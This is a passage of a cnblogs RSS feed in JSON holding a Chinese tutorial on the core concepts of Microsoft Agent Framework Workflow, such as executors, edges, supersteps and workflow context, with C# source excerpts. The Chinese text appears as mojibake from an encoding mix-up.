{
  "title": "ä¸»é¡µ - åšå®¢å›­",
  "link": "https://www.cnblogs.com/",
  "description": "ä¸»é¡µ - åšå®¢å›­ RSS",
  "entries": [
    {
      "title": ".NET+AI | Workflow | æ ¸å¿ƒæ¦‚å¿µé€Ÿé€šï¼ˆ1ï¼‰",
      "link": "https://www.cnblogs.com/sheng-jie/p/19508743",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/sheng-jie/p/19508743\" id=\"cb_post_title_url\" title=\"å‘å¸ƒäº 2026-01-20 20:34\">\n    <span>.NET+AI | Workflow | æ ¸å¿ƒæ¦‚å¿µé€Ÿé€šï¼ˆ1ï¼‰</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<h1 id=\"maf-workflow-æ ¸å¿ƒæ¦‚å¿µè¯¦è§£\">MAF Workflow æ ¸å¿ƒæ¦‚å¿µè¯¦è§£</h1>\n<h2 id=\"-æœ¬è¯¾æ¦‚è§ˆ\">ğŸ“š æœ¬è¯¾æ¦‚è§ˆ</h2>\n<p><strong>Microsoft Agent Framework (MAF)</strong> æä¾›äº†ä¸€å¥—å¼ºå¤§çš„ <strong>Workflowï¼ˆå·¥ä½œæµï¼‰</strong> æ¡†æ¶ï¼Œç”¨äºç¼–æ’å’Œåè°ƒå¤šä¸ªæ™ºèƒ½ä½“ï¼ˆAgentï¼‰æˆ–å¤„ç†ç»„ä»¶çš„æ‰§è¡Œæµç¨‹ã€‚</p>\n<p>æœ¬è¯¾å°†ä»¥<strong>é€šä¿—æ˜“æ‡‚</strong>çš„æ–¹å¼ï¼Œå¸®åŠ©ä½ ç†è§£ MAF Workflow çš„æ ¸å¿ƒæ¦‚å¿µï¼š</p>\n<table>\n<thead>\n<tr>\n<th>æ¦‚å¿µ</th>\n<th>è¯´æ˜</th>\n<th>ç±»æ¯”</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>Workflow</strong></td>\n<td>å·¥ä½œæµå®šä¹‰</td>\n<td>ğŸ“‹ æµç¨‹å›¾</td>\n</tr>\n<tr>\n<td><strong>Executor</strong></td>\n<td>æ‰§è¡Œå™¨/å¤„ç†èŠ‚ç‚¹</td>\n<td>ğŸ”§ å·¥äºº</td>\n</tr>\n<tr>\n<td><strong>Edge</strong></td>\n<td>è¿æ¥è¾¹</td>\n<td>â¡ï¸ ä¼ é€å¸¦</td>\n</tr>\n<tr>\n<td><strong>SuperStep</strong></td>\n<td>è¶…æ­¥/æ‰¹é‡å¤„ç†</td>\n<td>â±ï¸ å¤„ç†å‘¨æœŸ</td>\n</tr>\n<tr>\n<td><strong>WorkflowContext</strong></td>\n<td>å·¥ä½œæµä¸Šä¸‹æ–‡</td>\n<td>ğŸ“¦ å·¥ä½œå°</td>\n</tr>\n<tr>\n<td><strong>WorkflowEvent</strong></td>\n<td>å·¥ä½œæµäº‹ä»¶</td>\n<td>ğŸ“£ é€šçŸ¥</td>\n</tr>\n<tr>\n<td><strong>Run</strong></td>\n<td>è¿è¡Œå®ä¾‹</td>\n<td>ğŸƒ ä¸€æ¬¡æ‰§è¡Œ</td>\n</tr>\n<tr>\n<td><strong>Checkpoint</strong></td>\n<td>æ£€æŸ¥ç‚¹</td>\n<td>ğŸ’¾ å­˜æ¡£ç‚¹</td>\n</tr>\n</tbody>\n</table>\n<p><img alt=\"\" src=\"https://files.mdnice.com/user/3327/16fe2c29-9841-49dd-b2ff-803e9abfd3f0.png\" /></p>\n<p>è®©æˆ‘ä»¬é€ä¸€æ·±å…¥äº†è§£è¿™äº›æ¦‚å¿µï¼</p>\n<h2 id=\"-ä¸ºä»€ä¹ˆéœ€è¦-workflow\">ğŸ¯ ä¸ºä»€ä¹ˆéœ€è¦ Workflowï¼Ÿ</h2>\n<p>åœ¨æ„å»º AI æ™ºèƒ½ä½“åº”ç”¨æ—¶ï¼Œæˆ‘ä»¬ç»å¸¸éœ€è¦ï¼š</p>\n<ol>\n<li><strong>å¤šæ­¥éª¤å¤„ç†</strong>ï¼šç”¨æˆ·è¯·æ±‚éœ€è¦ç»è¿‡å¤šä¸ªå¤„ç†ç¯èŠ‚</li>\n<li><strong>å¤šæ™ºèƒ½ä½“åä½œ</strong>ï¼šä¸åŒçš„ Agent å„å¸å…¶èŒï¼ŒååŒå®Œæˆä»»åŠ¡</li>\n<li><strong>æ¡ä»¶åˆ†æ”¯</strong>ï¼šæ ¹æ®å¤„ç†ç»“æœå†³å®šä¸‹ä¸€æ­¥èµ°å‘</li>\n<li><strong>å¹¶è¡Œå¤„ç†</strong>ï¼šæŸäº›ä»»åŠ¡å¯ä»¥åŒæ—¶è¿›è¡Œä»¥æé«˜æ•ˆç‡</li>\n<li><strong>çŠ¶æ€ç®¡ç†</strong>ï¼šéœ€è¦åœ¨å¤„ç†è¿‡ç¨‹ä¸­ä¿å­˜å’Œæ¢å¤çŠ¶æ€</li>\n</ol>\n<p><strong>ä¼ ç»Ÿæ–¹å¼çš„é—®é¢˜ï¼š</strong></p>\n<pre><code class=\"language-csharp\">// âŒ ç¡¬ç¼–ç çš„æµç¨‹ï¼Œéš¾ä»¥ç»´æŠ¤å’Œæ‰©å±•\nvar result1 = await agent1.ProcessAsync(input);\nif (result1.Success)\n{\n    var result2 = await agent2.ProcessAsync(result1.Data);\n    // ... è¶Šæ¥è¶Šå¤æ‚\n}\n</code></pre>\n<p><strong>ä½¿ç”¨ Workflow çš„ä¼˜åŠ¿ï¼š</strong></p>\n<pre><code class=\"language-csharp\">// âœ… å£°æ˜å¼å®šä¹‰ï¼Œæ¸…æ™°å¯ç»´æŠ¤\nvar workflow = new WorkflowBuilder(startExecutor)\n    .AddEdge(executor1, executor2)\n    .AddEdge(executor2, executor3, condition: x =&gt; x.Success)\n    .Build();\n</code></pre>\n<p><img alt=\"\" src=\"https://files.mdnice.com/user/3327/39f9dccf-b55a-4c3d-ac26-aaa65919d7d4.png\" /></p>\n<hr />\n<h1 id=\"ä¸€æ ¸å¿ƒæ¦‚å¿µexecutoræ‰§è¡Œå™¨\">ä¸€ã€æ ¸å¿ƒæ¦‚å¿µï¼šExecutorï¼ˆæ‰§è¡Œå™¨ï¼‰</h1>\n<h2 id=\"-ä»€ä¹ˆæ˜¯-executor\">ğŸ”§ ä»€ä¹ˆæ˜¯ Executorï¼Ÿ</h2>\n<p><strong>Executorï¼ˆæ‰§è¡Œå™¨ï¼‰</strong> æ˜¯ Workflow ä¸­çš„<strong>æœ€å°å·¥ä½œå•å…ƒ</strong>ï¼Œç±»ä¼¼äºï¼š</p>\n<table>\n<thead>\n<tr>\n<th>ç±»æ¯”</th>\n<th>è¯´æ˜</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>ğŸ§‘â€ğŸ­ å·¥å‚é‡Œçš„å·¥äºº</td>\n<td>æ¯ä¸ªå·¥äººè´Ÿè´£ä¸€é“å·¥åº</td>\n</tr>\n<tr>\n<td>ğŸ§± ä¹é«˜ç§¯æœ¨å—</td>\n<td>æ¯ä¸ªç§¯æœ¨æœ‰ç‰¹å®šåŠŸèƒ½ï¼Œç»„åˆæˆæ•´ä½“</td>\n</tr>\n<tr>\n<td>ğŸ”Œ ç”µè·¯ä¸­çš„å…ƒä»¶</td>\n<td>æ¥æ”¶è¾“å…¥ä¿¡å·ï¼Œè¾“å‡ºå¤„ç†ç»“æœ</td>\n</tr>\n</tbody>\n</table>\n<p><img alt=\"\" src=\"https://files.mdnice.com/user/3327/aa65b104-e8de-4b37-aa64-aaa48d6132d5.png\" /></p>\n<h2 id=\"-executor-çš„æ ¸å¿ƒç‰¹å¾\">ğŸ“Œ Executor çš„æ ¸å¿ƒç‰¹å¾</h2>\n<ol>\n<li><strong>å”¯ä¸€æ ‡è¯†ï¼ˆIdï¼‰</strong>ï¼šæ¯ä¸ª Executor æœ‰ä¸€ä¸ªå”¯ä¸€çš„ IDï¼Œç”¨äºåœ¨ Workflow ä¸­å¼•ç”¨</li>\n<li><strong>æ¶ˆæ¯å¤„ç†</strong>ï¼šæ¥æ”¶ç‰¹å®šç±»å‹çš„è¾“å…¥æ¶ˆæ¯ï¼Œå¤„ç†åäº§ç”Ÿè¾“å‡ºæ¶ˆæ¯</li>\n<li><strong>è·¯ç”±é…ç½®</strong>ï¼šé€šè¿‡ <code>ConfigureRoutes</code> æ–¹æ³•å®šä¹‰èƒ½å¤„ç†å“ªäº›ç±»å‹çš„æ¶ˆæ¯</li>\n<li><strong>çŠ¶æ€æ„ŸçŸ¥</strong>ï¼šå¯ä»¥é€šè¿‡ <code>IWorkflowContext</code> è®¿é—®å’Œä¿®æ”¹å·¥ä½œæµçŠ¶æ€</li>\n</ol>\n<h2 id=\"ï¸-executor-çš„ç±»å‹å±‚æ¬¡\">ğŸ—ï¸ Executor çš„ç±»å‹å±‚æ¬¡</h2>\n<p>MAF æä¾›äº†å¤šç§ Executor ç±»å‹ï¼Œæ»¡è¶³ä¸åŒåœºæ™¯éœ€æ±‚ï¼š</p>\n<table>\n<thead>\n<tr>\n<th>ç±»å‹</th>\n<th>ç”¨é€”</th>\n<th>ç¤ºä¾‹åœºæ™¯</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><code>Executor&lt;TInput&gt;</code></td>\n<td>å¤„ç†æ¶ˆæ¯ï¼Œæ— è¿”å›å€¼</td>\n<td>æ—¥å¿—è®°å½•ã€é€šçŸ¥å‘é€</td>\n</tr>\n<tr>\n<td><code>Executor&lt;TInput, TOutput&gt;</code></td>\n<td>å¤„ç†æ¶ˆæ¯ï¼Œæœ‰è¿”å›å€¼</td>\n<td>æ•°æ®è½¬æ¢ã€AI è°ƒç”¨</td>\n</tr>\n<tr>\n<td><code>FunctionExecutor&lt;T&gt;</code></td>\n<td>ç”¨å§”æ‰˜å‡½æ•°å¿«é€Ÿåˆ›å»º</td>\n<td>ç®€å•å¤„ç†é€»è¾‘</td>\n</tr>\n<tr>\n<td><code>StatefulExecutor&lt;TState&gt;</code></td>\n<td>éœ€è¦ç»´æŠ¤çŠ¶æ€çš„æ‰§è¡Œå™¨</td>\n<td>ä¼šè¯ç®¡ç†ã€è®¡æ•°å™¨</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"-executor-æºç è§£æ\">ğŸ’¡ Executor æºç è§£æ</h2>\n<p>ä»æºç ä¸­å¯ä»¥çœ‹åˆ° Executor çš„æ ¸å¿ƒè®¾è®¡ï¼š</p>\n<pre><code class=\"language-csharp\">// æ¥è‡ª Executor.cs\npublic abstract class Executor : IIdentified\n{\n    // å”¯ä¸€æ ‡è¯†ç¬¦\n    public string Id { get; }\n    \n    // é…ç½®æ¶ˆæ¯è·¯ç”±ï¼ˆå­ç±»å¿…é¡»å®ç°ï¼‰\n    protected abstract RouteBuilder ConfigureRoutes(RouteBuilder routeBuilder);\n    \n    // æ‰§è¡Œæ¶ˆæ¯å¤„ç†\n    public async ValueTask&lt;object?&gt; ExecuteAsync(\n        object message, \n        TypeId messageType, \n        IWorkflowContext context, \n        CancellationToken cancellationToken = default)\n    {\n        // è®°å½•è°ƒç”¨äº‹ä»¶\n        await context.AddEventAsync(new ExecutorInvokedEvent(this.Id, message));\n        \n        // è·¯ç”±æ¶ˆæ¯åˆ°æ­£ç¡®çš„å¤„ç†å™¨\n        CallResult? result = await this.Router.RouteMessageAsync(message, context, ...);\n        \n        // è®°å½•å®Œæˆæˆ–å¤±è´¥äº‹ä»¶\n        ExecutorEvent executionResult = result?.IsSuccess is not false\n            ? new ExecutorCompletedEvent(this.Id, result?.Result)\n            : new ExecutorFailedEvent(this.Id, result.Exception);\n            \n        await context.AddEventAsync(executionResult);\n        return result.Result;\n    }\n}\n</code></pre>\n<p><strong>å…³é”®ç‚¹</strong>ï¼š</p>\n<ul>\n<li>âœ… æ¯ä¸ª Executor æœ‰å”¯ä¸€ ID</li>\n<li>âœ… é€šè¿‡ <code>ConfigureRoutes</code> å£°æ˜èƒ½å¤„ç†çš„æ¶ˆæ¯ç±»å‹</li>\n<li>âœ… æ‰§è¡Œè¿‡ç¨‹ä¼šäº§ç”Ÿäº‹ä»¶ï¼ˆ<code>ExecutorInvokedEvent</code>ã€<code>ExecutorCompletedEvent</code> ç­‰ï¼‰</li>\n</ul>\n<hr />\n<h1 id=\"äºŒæ ¸å¿ƒæ¦‚å¿µedgeè¾¹\">äºŒã€æ ¸å¿ƒæ¦‚å¿µï¼šEdgeï¼ˆè¾¹ï¼‰</h1>\n<h2 id=\"ï¸-ä»€ä¹ˆæ˜¯-edge\">â¡ï¸ ä»€ä¹ˆæ˜¯ Edgeï¼Ÿ</h2>\n<p><strong>Edgeï¼ˆè¾¹ï¼‰</strong> æ˜¯è¿æ¥ä¸¤ä¸ª Executor çš„<strong>æ¶ˆæ¯é€šé“</strong>ï¼Œç±»ä¼¼äºï¼š</p>\n<table>\n<thead>\n<tr>\n<th>ç±»æ¯”</th>\n<th>è¯´æ˜</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>ğŸ­ å·¥å‚ä¼ é€å¸¦</td>\n<td>æŠŠä¸Šä¸€é“å·¥åºçš„äº§å“ä¼ é€åˆ°ä¸‹ä¸€é“å·¥åº</td>\n</tr>\n<tr>\n<td>ğŸ”— æ°´ç®¡</td>\n<td>æŠŠæ°´ä»ä¸€ä¸ªå®¹å™¨å¼•å¯¼åˆ°å¦ä¸€ä¸ªå®¹å™¨</td>\n</tr>\n<tr>\n<td>ğŸ“¨ é‚®è·¯</td>\n<td>æŠŠä¿¡ä»¶ä»å‘ä»¶äººé€åˆ°æ”¶ä»¶äºº</td>\n</tr>\n</tbody>\n</table>\n<p><img alt=\"\" src=\"https://files.mdnice.com/user/3327/bb96f0fb-ff6c-44d8-8186-6943c986f5ce.png\" /></p>\n<h2 id=\"-edge-çš„ä¸‰ç§ç±»å‹\">ğŸ“Œ Edge çš„ä¸‰ç§ç±»å‹</h2>\n<p>MAF æ”¯æŒä¸‰ç§ç±»å‹çš„ Edgeï¼Œé€‚ç”¨äºä¸åŒçš„æµç¨‹æ¨¡å¼ï¼š</p>\n<p><img alt=\"\" src=\"https://files.mdnice.com/user/3327/aaa31c9e-2271-4777-aba4-da9ba0e58382.png\" /></p>\n<table>\n<thead>\n<tr>\n<th>ç±»å‹</th>\n<th>è¯´æ˜</th>\n<th>ä½¿ç”¨åœºæ™¯</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>Directï¼ˆç›´è¿ï¼‰</strong></td>\n<td>ä¸€å¯¹ä¸€è¿æ¥</td>\n<td>é¡ºåºå¤„ç†æµç¨‹</td>\n</tr>\n<tr>\n<td><strong>FanOutï¼ˆæ‰‡å‡ºï¼‰</strong></td>\n<td>ä¸€å¯¹å¤šè¿æ¥</td>\n<td>å¹¶è¡Œåˆ†å‘ä»»åŠ¡</td>\n</tr>\n<tr>\n<td><strong>FanInï¼ˆæ‰‡å…¥ï¼‰</strong></td>\n<td>å¤šå¯¹ä¸€è¿æ¥</td>\n<td>æ±‡èšå¤šä¸ªç»“æœ</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"-edge-æºç è§£æ\">ğŸ’¡ Edge æºç è§£æ</h2>\n<p>ä»æºç å¯ä»¥çœ‹åˆ° Edge çš„æ ¸å¿ƒç»“æ„ï¼š</p>\n<pre><code class=\"language-csharp\">// æ¥è‡ª Edge.cs\npublic enum EdgeKind\n{\n    Direct,   // ç›´è¿ï¼šä¸€å¯¹ä¸€\n    FanOut,   // æ‰‡å‡ºï¼šä¸€å¯¹å¤š\n    FanIn     // æ‰‡å…¥ï¼šå¤šå¯¹ä¸€\n}\n\npublic sealed class Edge\n{\n    public EdgeKind Kind { get; init; }    // è¾¹çš„ç±»å‹\n    public EdgeData Data { get; init; }    // è¾¹çš„å…·ä½“æ•°æ®\n}\n\n// æ¥è‡ª DirectEdgeData.cs - ç›´è¿è¾¹çš„æ•°æ®\npublic sealed class DirectEdgeData : EdgeData\n{\n    public string SourceId { get; }        // æº Executor ID\n    public string SinkId { get; }          // ç›®æ ‡ Executor ID\n    public Func&lt;object?, bool&gt;? Condition; // å¯é€‰çš„æ¡ä»¶åˆ¤æ–­\n}\n</code></pre>\n<p><strong>Direct Edge ç¤ºæ„å›¾</strong>ï¼š</p>\n<p><img alt=\"\" src=\"https://files.mdnice.com/user/3327/aa742609-8a85-4f6c-bc63-2cf3790a3f53.png\" /></p>\n<p><strong>å…³é”®ç‚¹</strong>ï¼š</p>\n<ul>\n<li>âœ… Edge å®šä¹‰äº†æ¶ˆæ¯ä»å“ªé‡Œæ¥ã€åˆ°å“ªé‡Œå»</li>\n<li>âœ… Direct Edge æ”¯æŒ<strong>æ¡ä»¶è·¯ç”±</strong>ï¼ˆåªæœ‰æ»¡è¶³æ¡ä»¶çš„æ¶ˆæ¯æ‰ä¼ é€’ï¼‰</li>\n<li>âœ… FanOut Edge å¯ä»¥å®ç°<strong>å¹¿æ’­</strong>æˆ–<strong>åˆ†åŒº</strong>é€»è¾‘</li>\n</ul>\n<hr />\n<h1 id=\"ä¸‰æ ¸å¿ƒæ¦‚å¿µworkflowå·¥ä½œæµ\">ä¸‰ã€æ ¸å¿ƒæ¦‚å¿µï¼šWorkflowï¼ˆå·¥ä½œæµï¼‰</h1>\n<h2 id=\"-ä»€ä¹ˆæ˜¯-workflow\">ğŸ“‹ ä»€ä¹ˆæ˜¯ Workflowï¼Ÿ</h2>\n<p><strong>Workflowï¼ˆå·¥ä½œæµï¼‰</strong> æ˜¯å°†å¤šä¸ª Executor é€šè¿‡ Edge è¿æ¥èµ·æ¥çš„<strong>å®Œæ•´æµç¨‹å®šä¹‰</strong>ï¼Œç±»ä¼¼äºï¼š</p>\n<table>\n<thead>\n<tr>\n<th>ç±»æ¯”</th>\n<th>è¯´æ˜</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>ğŸ“‹ æµç¨‹å›¾</td>\n<td>å®šä¹‰äº†ä»å¼€å§‹åˆ°ç»“æŸçš„å®Œæ•´æµç¨‹</td>\n</tr>\n<tr>\n<td>ğŸ­ ç”Ÿäº§çº¿</td>\n<td>å¤šä¸ªå·¥ä½é€šè¿‡ä¼ é€å¸¦è¿æ¥æˆå®Œæ•´ç”Ÿäº§çº¿</td>\n</tr>\n<tr>\n<td>ğŸ¼ ä¹è°±</td>\n<td>è§„å®šäº†æ¼”å¥çš„é¡ºåºå’ŒèŠ‚å¥</td>\n</tr>\n</tbody>\n</table>\n<p><img alt=\"\" src=\"https://files.mdnice.com/user/3327/e79021e2-7ba8-4857-8664-d670d74e7d89.png\" /></p>\n<h2 id=\"-workflow-çš„æ ¸å¿ƒå±æ€§\">ğŸ“Œ Workflow çš„æ ¸å¿ƒå±æ€§</h2>\n<p>ä»æºç ä¸­å¯ä»¥çœ‹åˆ° Workflow çš„æ ¸å¿ƒç»“æ„ï¼š</p>\n<pre><code class=\"language-csharp\">// æ¥è‡ª Workflow.cs\npublic class Workflow\n{\n    // èµ·å§‹ Executor çš„ ID\n    public string StartExecutorId { get; }\n    \n    // å·¥ä½œæµåç§°ï¼ˆå¯é€‰ï¼‰\n    public string? Name { get; internal init; }\n    \n    // å·¥ä½œæµæè¿°ï¼ˆå¯é€‰ï¼‰\n    public string? Description { get; internal init; }\n    \n    // Executor ç»‘å®šå­—å…¸\n    internal Dictionary&lt;string, ExecutorBinding&gt; ExecutorBindings { get; init; }\n    \n    // è¾¹çš„é›†åˆï¼ˆæŒ‰æºèŠ‚ç‚¹åˆ†ç»„ï¼‰\n    internal Dictionary&lt;string, HashSet&lt;Edge&gt;&gt; Edges { get; init; }\n    \n    // è¾“å‡º Executor é›†åˆ\n    internal HashSet&lt;string&gt; OutputExecutors { get; init; }\n}\n</code></pre>\n<h2 id=\"-ä½¿ç”¨-workflowbuilder-æ„å»ºå·¥ä½œæµ\">ğŸ”¨ ä½¿ç”¨ WorkflowBuilder æ„å»ºå·¥ä½œæµ</h2>\n<p>MAF é‡‡ç”¨ <strong>å»ºé€ è€…æ¨¡å¼ï¼ˆBuilder Patternï¼‰</strong> æ¥æ„å»º Workflowï¼Œè¿™ä½¿å¾—å·¥ä½œæµçš„å®šä¹‰æ›´åŠ ç›´è§‚ï¼š</p>\n<pre><code class=\"language-csharp\">// åˆ›å»ºå·¥ä½œæµç¤ºä¾‹\nvar workflow = new WorkflowBuilder(startExecutor)  // æŒ‡å®šèµ·ç‚¹\n    .WithName(\"è®¢å•å¤„ç†å·¥ä½œæµ\")                      // è®¾ç½®åç§°\n    .WithDescription(\"å¤„ç†ç”µå•†è®¢å•çš„å®Œæ•´æµç¨‹\")       // è®¾ç½®æè¿°\n    .AddEdge(receiveOrder, validateOrder)           // æ·»åŠ è¾¹\n    .AddEdge(validateOrder, processPayment, \n             condition: x =&gt; x.IsValid)             // æ¡ä»¶è¾¹\n    .AddEdge(processPayment, sendNotification)\n    .WithOutputFrom(sendNotification)               // æŒ‡å®šè¾“å‡ºèŠ‚ç‚¹\n    .Build();                                       // æ„å»ºå·¥ä½œæµ\n</code></pre>\n<p><img alt=\"\" src=\"https://files.mdnice.com/user/3327/704eac82-db13-4ba4-beb5-6b9d3c8b30e9.png\" /></p>\n<p><strong>å…³é”®æ–¹æ³•</strong>ï¼š</p>\n<table>\n<thead>\n<tr>\n<th>æ–¹æ³•</th>\n<th>è¯´æ˜</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><code>AddEdge(source, sink)</code></td>\n<td>æ·»åŠ ç›´è¿è¾¹</td>\n</tr>\n<tr>\n<td><code>AddEdge(..., condition)</code></td>\n<td>æ·»åŠ æ¡ä»¶è¾¹</td>\n</tr>\n<tr>\n<td><code>AddFanOut(source, sinks)</code></td>\n<td>æ·»åŠ æ‰‡å‡ºè¾¹</td>\n</tr>\n<tr>\n<td><code>AddFanIn(sources, sink)</code></td>\n<td>æ·»åŠ æ‰‡å…¥è¾¹</td>\n</tr>\n<tr>\n<td><code>WithOutputFrom(executor)</code></td>\n<td>æŒ‡å®šè¾“å‡ºèŠ‚ç‚¹</td>\n</tr>\n<tr>\n<td><code>BindExecutor(executor)</code></td>\n<td>ç»‘å®šå ä½ç¬¦æ‰§è¡Œå™¨</td>\n</tr>\n<tr>\n<td><code>Build()</code></td>\n<td>æ„å»ºæœ€ç»ˆçš„ Workflow</td>\n</tr>\n</tbody>\n</table>\n<hr />\n<h1 id=\"å››æ ¸å¿ƒæ¦‚å¿µsuperstepè¶…æ­¥\">å››ã€æ ¸å¿ƒæ¦‚å¿µï¼šSuperStepï¼ˆè¶…æ­¥ï¼‰</h1>\n<h2 id=\"ï¸-ä»€ä¹ˆæ˜¯-superstep\">â±ï¸ ä»€ä¹ˆæ˜¯ SuperStepï¼Ÿ</h2>\n<p><strong>SuperStepï¼ˆè¶…æ­¥ï¼‰</strong> æ˜¯ Workflow æ‰§è¡Œçš„<strong>åŸºæœ¬å¤„ç†å‘¨æœŸ</strong>ã€‚å¯ä»¥ç±»æ¯”ä¸ºï¼š</p>\n<table>\n<thead>\n<tr>\n<th>ç±»æ¯”</th>\n<th>è¯´æ˜</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>ğŸ® æ¸¸æˆä¸­çš„\"å›åˆ\"</td>\n<td>æ¯ä¸ªå›åˆå†…æ‰€æœ‰ç©å®¶åŒæ—¶è¡ŒåŠ¨</td>\n</tr>\n<tr>\n<td>â° å·¥å‚çš„\"ç­æ¬¡\"</td>\n<td>æ¯ä¸ªç­æ¬¡å†…å®Œæˆä¸€æ‰¹ä»»åŠ¡</td>\n</tr>\n<tr>\n<td>ğŸŒŠ æµ·æµªçš„\"ä¸€æ³¢\"</td>\n<td>ä¸€æ³¢æ¶ˆæ¯è¢«å¤„ç†ï¼Œç„¶åäº§ç”Ÿä¸‹ä¸€æ³¢</td>\n</tr>\n</tbody>\n</table>\n<p><img alt=\"\" src=\"https://files.mdnice.com/user/3327/a29f83ea-1584-4b2b-a7a8-f81be1dd3567.png\" /></p>\n<h2 id=\"-superstep-çš„æ‰§è¡Œæµç¨‹\">ğŸ“Œ SuperStep çš„æ‰§è¡Œæµç¨‹</h2>\n<p>æ¯ä¸ª SuperStep å†…éƒ¨æ‰§è¡Œçš„æ­¥éª¤ï¼š</p>\n<p><img alt=\"\" src=\"https://files.mdnice.com/user/3327/6147f4a0-86b5-48c7-9401-34ad638867e9.png\" /></p>\n<p><strong>å…³é”®äº‹ä»¶</strong>ï¼š</p>\n<ul>\n<li><code>SuperStepStartedEvent</code>ï¼šè¶…æ­¥å¼€å§‹</li>\n<li><code>SuperStepCompletedEvent</code>ï¼šè¶…æ­¥å®Œæˆ</li>\n</ul>\n<pre><code class=\"language-csharp\">// SuperStep äº‹ä»¶å®šä¹‰\npublic class SuperStepEvent(int stepNumber, object? data = null) : WorkflowEvent(data)\n{\n    // è¶…æ­¥çš„åºå·ï¼ˆä» 0 å¼€å§‹ï¼‰\n    public int StepNumber =&gt; stepNumber;\n}\n</code></pre>\n<hr />\n<h1 id=\"äº”æ ¸å¿ƒæ¦‚å¿µworkflowcontextå·¥ä½œæµä¸Šä¸‹æ–‡\">äº”ã€æ ¸å¿ƒæ¦‚å¿µï¼šWorkflowContextï¼ˆå·¥ä½œæµä¸Šä¸‹æ–‡ï¼‰</h1>\n<h2 id=\"-ä»€ä¹ˆæ˜¯-workflowcontext\">ğŸ“¦ ä»€ä¹ˆæ˜¯ WorkflowContextï¼Ÿ</h2>\n<p><strong>WorkflowContextï¼ˆå·¥ä½œæµä¸Šä¸‹æ–‡ï¼‰</strong> æ˜¯ Executor æ‰§è¡Œæ—¶çš„<strong>è¿è¡Œç¯å¢ƒ</strong>ï¼Œç±»ä¼¼äºï¼š</p>\n<table>\n<thead>\n<tr>\n<th>ç±»æ¯”</th>\n<th>è¯´æ˜</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>ğŸ› ï¸ å·¥äººçš„å·¥ä½œå°</td>\n<td>æä¾›å·¥å…·ã€ææ–™å’Œé€šä¿¡æ¸ é“</td>\n</tr>\n<tr>\n<td>ğŸ“ é€šä¿¡æ¢çº½</td>\n<td>å…è®¸å„ä¸ªå·¥ä½ä¹‹é—´ä¼ é€’ä¿¡æ¯</td>\n</tr>\n<tr>\n<td>ğŸ’¾ å…±äº«å†…å­˜</td>\n<td>å­˜å‚¨å’Œè¯»å–çŠ¶æ€æ•°æ®</td>\n</tr>\n</tbody>\n</table>\n<p><img alt=\"\" src=\"https://files.mdnice.com/user/3327/9c0a978e-6470-4199-9bc3-78d4bacd4e8c.png\" /></p>\n<h2 id=\"-iworkflowcontext-æ ¸å¿ƒæ¥å£\">ğŸ“Œ IWorkflowContext æ ¸å¿ƒæ¥å£</h2>\n<pre><code class=\"language-csharp\">// æ¥è‡ª IWorkflowContext.cs\npublic interface IWorkflowContext\n{\n    // æ·»åŠ å·¥ä½œæµäº‹ä»¶ï¼ˆåœ¨å½“å‰ SuperStep ç»“æŸæ—¶è§¦å‘ï¼‰\n    ValueTask AddEventAsync(WorkflowEvent workflowEvent, CancellationToken cancellationToken = default);\n    \n    // å‘é€æ¶ˆæ¯ç»™ä¸‹æ¸¸ Executorï¼ˆåœ¨ä¸‹ä¸€ä¸ª SuperStep å¤„ç†ï¼‰\n    ValueTask SendMessageAsync(object message, string? targetId, CancellationToken cancellationToken = default);\n    \n    // è¾“å‡ºå·¥ä½œæµç»“æœ\n    ValueTask YieldOutputAsync(object output, CancellationToken cancellationToken = default);\n    \n    // è¯·æ±‚åœ¨å½“å‰ SuperStep ç»“æŸæ—¶åœæ­¢å·¥ä½œæµ\n    ValueTask RequestHaltAsync();\n    \n    // è¯»å–çŠ¶æ€\n    ValueTask&lt;T?&gt; ReadStateAsync&lt;T&gt;(string key, string? scopeName = null, CancellationToken cancellationToken = default);\n    \n    // è¯»å–æˆ–åˆå§‹åŒ–çŠ¶æ€\n    ValueTask&lt;T&gt; ReadOrInitStateAsync&lt;T&gt;(string key, Func&lt;T&gt; initialStateFactory, string? scopeName = null, CancellationToken cancellationToken = default);\n    \n    // æ›´æ–°çŠ¶æ€ï¼ˆæ’é˜Ÿæ›´æ–°ï¼Œåœ¨ SuperStep ç»“æŸæ—¶åº”ç”¨ï¼‰\n    ValueTask QueueStateUpdateAsync&lt;T&gt;(string key, T value, string? scopeName = null, CancellationToken cancellationToken = default);\n}\n</code></pre>\n<p><strong>å…³é”®ç‚¹</strong>ï¼š</p>\n<ul>\n<li>âœ… <strong>æ¶ˆæ¯ä¼ é€’</strong>ï¼šé€šè¿‡ <code>SendMessageAsync</code> åœ¨ Executor ä¹‹é—´ä¼ é€’æ¶ˆæ¯</li>\n<li>âœ… <strong>çŠ¶æ€ç®¡ç†</strong>ï¼šæ”¯æŒè¯»å–ã€åˆå§‹åŒ–å’Œæ›´æ–°çŠ¶æ€</li>\n<li>âœ… <strong>äº‹ä»¶é€šçŸ¥</strong>ï¼šé€šè¿‡ <code>AddEventAsync</code> å‘å‡ºäº‹ä»¶</li>\n<li>âœ… <strong>æµç¨‹æ§åˆ¶</strong>ï¼šé€šè¿‡ <code>RequestHaltAsync</code> åœæ­¢å·¥ä½œæµ</li>\n</ul>\n<hr />\n<h1 id=\"å…­æ ¸å¿ƒæ¦‚å¿µworkfloweventå·¥ä½œæµäº‹ä»¶\">å…­ã€æ ¸å¿ƒæ¦‚å¿µï¼šWorkflowEventï¼ˆå·¥ä½œæµäº‹ä»¶ï¼‰</h1>\n<h2 id=\"-ä»€ä¹ˆæ˜¯-workflowevent\">ğŸ“£ ä»€ä¹ˆæ˜¯ 